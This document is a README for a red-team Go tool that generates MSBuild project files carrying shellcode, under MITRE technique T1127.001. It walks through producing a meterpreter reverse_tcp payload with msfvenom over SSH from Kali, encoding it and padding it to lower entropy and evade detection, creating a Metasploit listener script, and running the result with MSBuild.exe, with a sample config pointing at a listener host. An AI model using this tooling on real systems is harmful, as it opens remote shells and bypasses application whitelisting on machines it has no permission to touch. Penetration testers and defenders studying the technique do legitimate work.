# T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild 

Built a golang prog that will create an XML file to be used with the technique to compile code on a host and then execute it.  Uses a config.json file that takes parameters for the configuration, uses an SSH connection to execute and create the payload (or a custom payload), and then creates the XML file or .csproj file.  

![wolfArmor.jpg](/projects/msBuildXML/wolfArmor.jpg)


The application allows you to customize a configuration file and call them as needed.
```txt
Usage (i.e. ./xml.bin -conf new.json):
  -conf string
        Configuration file to read (default "config.json")
```

#### Explanation of the config.json file:

outputFile - This is the file that is created to be used by the following command using msbuild.exe on a host that has .NET 4 installed

```cmd
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe test.csproj
```

outputFileResourceScript - This is a generated resource script for use in metasploit.  The purpose of the resource script is to setup a listener with the specified payload, lhost and lport specified in the configuration file.  Below is the command to execute on metasploit.

```bash
msfconsole -r my.rs
```

customPayload - If a customPayload is placed here the golang program does not connect by SSH to Kali, use msfvenom and then create the raw C shellcode.  If you use a custom payload it needs to be gzipped and then base64 encoded.  Spaces will be added to the payload to decrease the entropy.

sshConfig - These settings are used to connect to Kali through SSH with a public key, then as a string the payload is returned after gzipped and base64 encoded.

metaploitConfig - These settings configure the payload, LHOST, and LPORT to be able to use msfvenom to create the raw shellcode, gzip and base64 and returns it as a string to be used in the c# program inside of the XML.


```json
{
        "outputFile": "test.csproj",
        "outputFileResourceScript": "my.rs",
        "customPayload": "None",
        "sshConfig": {
                "sshKali": "true",
                "sshUsername": "thepcn3rd",
                "sshPubKeyLocation": "/home/thepcn3rd/.ssh/id_rsa",
                "sshHost": "10.27.20.173"
        },
        "metasploitConfig": {
                "payload": "windows/meterpreter/reverse_tcp",
                "LHOST": "10.27.20.173",
                "LPORT": "52000"
        }
}
```

**Definition:** Entropy can be used as an indication of whether the file might contain malicious content.  For example, ASCII text files are typically highly compressible and have low entropy.  Encrypted data is typically not compressible, and usually has a high entropy.

References:

https://gist.githubusercontent.com/dxflatline/99de0da360a13c565a00a1b07b34f5d1/raw/63586f21b84d28c121418ab78620932ec9c546e6/msbuild_sc_alloc.csproj

Hack the Box - Ascension

https://attack.mitre.org/techniques/T1127/001/

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127.001/src/T1127.001.csproj
